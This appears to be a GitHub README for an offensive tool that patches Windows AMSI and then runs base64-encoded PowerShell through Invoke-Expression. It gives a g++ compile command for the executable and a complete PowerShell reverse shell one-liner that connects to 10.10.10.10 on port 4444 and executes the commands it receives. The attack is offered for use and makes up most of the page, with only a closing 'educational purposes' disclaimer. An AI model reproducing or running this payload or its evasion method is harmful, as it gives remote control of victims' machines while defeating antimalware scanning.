#AmsiBypass and ReverseShell

## Demo Video

 
https://user-images.githubusercontent.com/89106058/232936480-b0e4e0d8-d435-449c-93c7-a3e8a150027e.mp4


## Compilation command

```powershell
g++ -m64 -o happy_hacking.exe -static main.cpp
```

## Important

- It is important to verify that the commands contained in the base64 belong exclusively to PowerShell to ensure their correct execution. 
- It exclusively uses Invoke-Expression so that the command is executed in the patched powershell, thus preventing a new instance from being created.

An example of a command that contains only PowerShell statements and can be base64 encoded:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10', 4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535 | ForEach-Object {0}; while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {$data = ([System.Text.Encoding]::ASCII).GetString($bytes, 0, $i);$sendback = (Invoke-Expression $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> ';$sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush()};$client.Close();
```

Finally, I am not responsible for what you do with the code, this is purely for educational purposes.
